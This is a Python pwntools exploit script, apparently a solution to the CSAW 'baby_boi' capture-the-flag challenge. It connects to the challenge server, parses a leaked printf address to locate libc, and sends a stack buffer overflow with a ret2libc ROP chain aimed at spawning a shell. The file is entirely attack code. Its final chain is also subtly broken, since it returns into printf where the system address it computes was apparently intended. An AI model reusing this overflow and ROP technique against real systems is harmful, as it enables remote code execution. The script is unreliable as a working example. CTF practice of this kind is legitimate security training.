from pwn import *
import re


binary = ELF("baby_boi")
rop = ROP(binary)
# printf_offset = 0x00055750
# system_offset = 0x00047850
# binsh_offset = 0x186cee
printf_offset = 0x00064e80
system_offset = 0x0004f440
binsh_offset = 0x1b3e9a
system_offset_from_printf = system_offset - printf_offset

# p = process(["./baby_boi"], shell=True)
# print(f"PID: {p.proc.pid}")

p = remote("pwn.chal.csaw.io", 1005)
pause()
prompt = p.read()
match = re.search(b'(0x[a-zA-Z0-9]+)', prompt)
leaked_addr = int(match.groups()[0].decode(), 16)
print(hex(leaked_addr))
base = leaked_addr - printf_offset
binsh_addr = base + binsh_offset
system_addr = leaked_addr + system_offset_from_printf
pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
payload = ("D"*32).encode() + ("B"*8).encode()
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(leaked_addr)
p.sendline(payload)
p.interactive()
p.close()

